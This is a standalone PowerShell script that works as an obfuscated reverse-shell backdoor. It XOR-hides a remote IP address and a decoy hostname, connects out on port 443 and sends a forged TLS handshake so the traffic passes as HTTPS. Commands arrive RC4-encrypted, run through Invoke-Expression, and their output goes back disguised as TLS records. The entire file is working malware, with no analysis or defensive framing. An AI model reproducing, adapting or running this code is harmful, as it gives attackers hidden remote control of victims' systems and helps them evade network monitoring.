$Secret = 0xf1,
0x6e,
0xcd,
0xc6,0x79,0x4c,0x66,0xd1,0x02,
0xf8,0x33,0xc4,0x86,
0xe7,0xa4,
0x35,0x8d,
0x69,0xbd,0xd2,0x1d,0x50,0xf5,0xfb,0xdf,0xec,0xaf,
0x0b,0x9e,0x53,
0xa4,0xd3
function XOR-Deobfuscate {
    param([int[]]$enc, [int]$key)
    $decoded = ""
    foreach ($char in $enc) {
        $decoded += [char]($char -bxor $key)
    }
    return $decoded
}
function RC4-Encrypt {
    param (
        [byte[]]$Key,
        [byte[]]$Data
    )
    $S = 0..255
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $Key[$i % $Key.Length]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
    }
    $i = 0
    $j = 0
    $Result = @()
    foreach ($byte in $Data) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
        $K = $S[($S[$i] + $S[$j]) % 256]
        $Result += ($byte -bxor $K)
    }
    return ,$Result
}
function Generate-Data {
    param ([string]$text)
    $plain = [System.Text.Encoding]::UTF8.GetBytes($text)
    $enc = (RC4-Encrypt -Key $Secret -Data $plain) + (0x02,0x04,0x06,0x08)
    $length = [System.BitConverter]::GetBytes([int16]$enc.Length)
    [Array]::Reverse($length)
    return (0x17, 0x03, 0x03) + $length + $enc
}
function Generate-ClientHello {
    $hostname = (XOR-Deobfuscate -enc @(168,187,172,183,184,167,240,186,171,169,176,177,176,186,187,172,240,189,177,179) -key 222)
    $hostnameBytes = [System.Text.Encoding]::ASCII.GetBytes($hostname)
    $hostnameLen = [byte[]] ([BitConverter]::GetBytes([UInt16]$hostnameBytes.Length))
    [Array]::Reverse($hostnameLen)
    $dnsEntry = @(0x00) + $hostnameLen + $hostnameBytes
    $dnsLen = [byte[]] ([BitConverter]::GetBytes([UInt16]$dnsEntry.Length))
    [Array]::Reverse($dnsLen)
    $sniData = $dnsLen + $dnsEntry
    $sniLen = [byte[]] ([BitConverter]::GetBytes([UInt16]$sniData.Length))
    [Array]::Reverse($sniLen)
    $sniExtension = @(0x00,
        0x00) + $sniLen + $sniData
    $fixedExtensions = @(0x00, 0x0b,0x00,0x04,0x03,0x00,0x01,0x02,
                         0x00,0x0a,0x00,0x16,0x00,0x14,0x00,0x1d,0x00,0x17,0x00,0x1e,0x00,0x19,0x00,0x18,0x01,0x00,0x01,0x01,0x01,0x02,0x01,0x03,0x01,0x04,
                         0x00,0x23,0x00,0x00,
                         0x00,0x16,0x00,0x00,
                         0x00,0x17,0x00,0x00,
                         0x00,0x0d,0x00,0x1e,0x00,0x1c,0x04,0x03,0x05,0x03,0x06,0x03,0x08,0x07,0x08,0x08,0x08,0x09,0x08,0x0a,0x08,0x0b,0x08,0x04,0x08,0x05,0x08,0x06,0x04,0x01,0x05,0x01,0x06,0x01,
                         0x00,0x2b,0x00,0x03,0x02,0x03,0x04,
                         0x00,0x2d,0x00,0x02,0x01,0x01,
                         0x00,0x33,0x00,0x26,0x00,0x24,0x00,0x1d,0x00,0x20,
                         0x35,0x80,0x72,0xd6,0x36,0x58,0x80,0xd1,0xae,0xea,0x32,0x9a,0xdf,0x91,0x21,0x38,0x38,0x51,0xed,0x21,0xa2,0x8e,0x3b,0x75,0xe9,0x65,0xd0,0xd2,0xcd,0x16,0x62,0x54)
    $extensions = $sniExtension + $fixedExtensions
    $extensionsLen = [byte[]] ([BitConverter]::GetBytes([UInt16]$extensions.Length))
    [Array]::Reverse($extensionsLen)
    $start = @(0x03,0x03,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,
        0x0d,0x0e,0x0f,
        0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
        0x18,
        0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0xe0,0xe1,
        0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xeb,0xec,0xed,0xee,0xef,0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,
        0xfb,0xfc,0xfd,0xfe,0xff,0x00,0x08,0x13,0x02,0x13,0x03,0x13,0x01,0x00,0xff,0x01,0x00)
    $clientHello = $start + $extensionsLen + $extensions
    $clientHelloLen = [byte[]] ([BitConverter]::GetBytes($clientHello.Length))
    [Array]::Reverse($clientHelloLen)
    $handshake = @(0x01) + $clientHelloLen[1..3] + $clientHello
    $handshakeLen = [byte[]] ([BitConverter]::GetBytes([UInt16]$handshake.Length))
    [Array]::Reverse($handshakeLen)
    $record = @(0x16,
        0x03, 0x01) + $handshakeLen + $handshake
    return ,$record
}
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect((XOR-Deobfuscate -enc @(5,7,25,2,25,3,15,25,5,7,7) -key 55), ((50 * 9) - (11 * 2)) + [math]::Pow(2, 3) + [math]::Sqrt(49))
$stream = $client.GetStream()
$hello = Generate-ClientHello
$stream.Write($hello, 0, $hello.Length)
$buffer = New-Object byte[] 16384
$stream.Read($buffer, 0, $buffer.Length) | Out-Null
while ($true) {
    $buffer = New-Object byte[] 16384
    try {
        $bytesRead = $stream.Read($buffer, 0, 16384)
    } catch {
        break
    }
    $enc = $buffer[5..($bytesRead - 1)]
    $cmd = [System.Text.Encoding]::UTF8.GetString((RC4-Encrypt -Key $Secret -Data $enc))
    if ($cmd -eq (XOR-Deobfuscate -enc @(109,112,97,124) -key 8)) { break }
    try {
        $output = (Invoke-Expression $cmd 2>&1) | Out-String
    } catch {
        $output = (XOR-Deobfuscate -enc @(186,141,141,144,141) -key 255)
    }
    $response = Generate-Data -text $output.Trim()
    $stream.Write($response, 0, $response.Length)
}
$stream.Close()
$client.Close()
